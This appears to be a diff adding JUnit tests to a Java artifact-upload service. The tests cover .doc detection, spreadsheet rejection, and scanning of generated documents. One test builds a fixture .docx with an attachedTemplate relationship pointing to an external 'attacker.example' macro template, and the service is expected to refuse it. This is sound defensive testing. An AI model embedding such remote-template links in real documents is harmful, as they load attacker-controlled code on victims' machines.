@@ -552,12 +552,105 @@ class ArtifactServiceTest {
         assertFalse(blobStore.objects.containsKey(allocated.blobKey()));
     }
 
+    /** The least a package needs to be a Word document: its main part, named by its relationships and typed by its manifest. */
     private static byte[] minimalOoxmlPackage() throws IOException {
         return zipOf(Map.of(
                 "[Content_Types].xml",
-                "<?xml version=\"1.0\"?><Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"/>",
+                "<?xml version=\"1.0\"?><Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">"
+                        + "<Override PartName=\"/word/document.xml\" ContentType=\"application/vnd.openxmlformats-officedocument"
+                        + ".wordprocessingml.document.main+xml\"/></Types>",
+                "_rels/.rels",
+                "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\""
+                        + " Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\""
+                        + " Target=\"word/document.xml\"/></Relationships>",
                 "word/document.xml",
                 "<w:document/>"));
+    }
+
+    @Test
+    void aCompoundFileIsReadByTheProbeItWasGivenAndRefusedWithoutOne() {
+        byte[] compoundFile = {(byte) 0xD0, (byte) 0xCF, 0x11, (byte) 0xE0, (byte) 0xA1, (byte) 0xB1, 0x1A, (byte) 0xE1, 0x00, 0x00};
+
+        FakeArtifactRepository repository = new FakeArtifactRepository();
+        ArtifactService withProbe = new ArtifactService(
+                repository, new FakeBlobStore(), new FakeMalwareScanner(), 1024, Duration.ofHours(24),
+                content -> io.github.vihuynh72.brownie.core.prepare.ConvertibleFormat.WORD_97);
+        Artifact word = withProbe.initiateUpload(WORKSPACE_ID, USER_ID, "form.doc");
+        assertEquals(
+                SupportedMediaType.DOC,
+                withProbe.receiveContent(WORKSPACE_ID, USER_ID, word.id(), new ByteArrayInputStream(compoundFile)).detectedMediaType());
+
+        FakeBlobStore blobStore = new FakeBlobStore();
+        ArtifactService withoutProbe = new ArtifactService(repository, blobStore, new FakeMalwareScanner(), 1024, Duration.ofHours(24));
+        Artifact refused = withoutProbe.initiateUpload(WORKSPACE_ID, USER_ID, "form.doc");
+        UnsupportedArtifactTypeException thrown = assertThrows(
+                UnsupportedArtifactTypeException.class,
+                () -> withoutProbe.receiveContent(WORKSPACE_ID, USER_ID, refused.id(), new ByteArrayInputStream(compoundFile)));
+        assertEquals(UnsupportedArtifactTypeException.Reason.NOT_A_DOCUMENT, thrown.reason());
+        assertEquals("UNSUPPORTED_MEDIA_TYPE", repository.find(WORKSPACE_ID, USER_ID, refused.id()).orElseThrow().rejectionReason());
+        assertTrue(blobStore.objects.isEmpty());
+    }
+
+    @Test
+    void aSpreadsheetIsRefusedAsOneButRecordedAsAnyOtherUnsupportedFile() throws IOException {
+        FakeArtifactRepository repository = new FakeArtifactRepository();
+        ArtifactService service =
+                new ArtifactService(repository, new FakeBlobStore(), new FakeMalwareScanner(), 1_000_000, Duration.ofHours(24));
+        byte[] workbook = zipOf(Map.of(
+                "[Content_Types].xml",
+                "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Override PartName=\"/xl/workbook.xml\""
+                        + " ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml\"/></Types>",
+                "_rels/.rels",
+                "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\""
+                        + " Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\""
+                        + " Target=\"xl/workbook.xml\"/></Relationships>",
+                "xl/workbook.xml",
+                "<workbook/>"));
+
+        Artifact allocated = service.initiateUpload(WORKSPACE_ID, USER_ID, "budget.docx");
+        UnsupportedArtifactTypeException thrown = assertThrows(
+                UnsupportedArtifactTypeException.class,
+                () -> service.receiveContent(WORKSPACE_ID, USER_ID, allocated.id(), new ByteArrayInputStream(workbook)));
+
+        assertEquals(UnsupportedArtifactTypeException.Reason.SPREADSHEET, thrown.reason());
+        assertEquals("UNSUPPORTED_MEDIA_TYPE", repository.find(WORKSPACE_ID, USER_ID, allocated.id()).orElseThrow().rejectionReason());
+    }
+
+    @Test
+    void generatedBytesGoThroughTheWholeUploadPipelineAndEndReady() throws IOException {
+        FakeArtifactRepository repository = new FakeArtifactRepository();
+        FakeMalwareScanner scanner = new FakeMalwareScanner();
+        ArtifactService service = new ArtifactService(repository, new FakeBlobStore(), scanner, 1_000_000, Duration.ofHours(24));
+
+        Artifact stored = service.storeGenerated(WORKSPACE_ID, USER_ID, "Working copy.docx", minimalOoxmlPackage());
+
+        assertEquals(ArtifactStatus.READY, stored.status());
+        assertEquals(SupportedMediaType.DOCX, stored.detectedMediaType());
+        assertEquals("Working copy.docx", stored.displayFilename());
+        assertEquals(1, scanner.scanCount);
+        assertEquals(new ContentInspection(SupportedMediaType.DOCX, null), service.inspectContent(WORKSPACE_ID, USER_ID, stored.id()));
+    }
+
+    @Test
+    void generatedBytesAreRefusedLikeAnUploadAndNeverReportedReadyWhenTheScanFlagsThem() throws IOException {
+        FakeArtifactRepository repository = new FakeArtifactRepository();
+        FakeMalwareScanner scanner = new FakeMalwareScanner();
+        ArtifactService service = new ArtifactService(repository, new FakeBlobStore(), scanner, 1_000_000, Duration.ofHours(24));
+
+        // A network link is refused in anything stored, Brownie's own output included.
+        byte[] linked = zipOf(Map.of(
+                "[Content_Types].xml", "<Types/>",
+                "word/_rels/settings.xml.rels",
+                "<Relationships><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships"
+                        + "/attachedTemplate\" Target=\"https://attacker.example/t.dotm\" TargetMode=\"External\"/></Relationships>"));
+        UnsupportedArtifactTypeException thrown = assertThrows(
+                UnsupportedArtifactTypeException.class, () -> service.storeGenerated(WORKSPACE_ID, USER_ID, "copy.docx", linked));
+        assertEquals(UnsupportedArtifactTypeException.Reason.REMOTE_CONTENT, thrown.reason());
+
+        scanner.willReturn(ScanResult.infected("Test-Signature"));
+        assertThrows(
+                io.github.vihuynh72.brownie.core.compile.GeneratedArtifactUnavailableException.class,
+                () -> service.storeGenerated(WORKSPACE_ID, USER_ID, "copy.docx", minimalOoxmlPackage()));
     }
 
     private static byte[] zipOf(Map<String, String> entries) throws IOException {
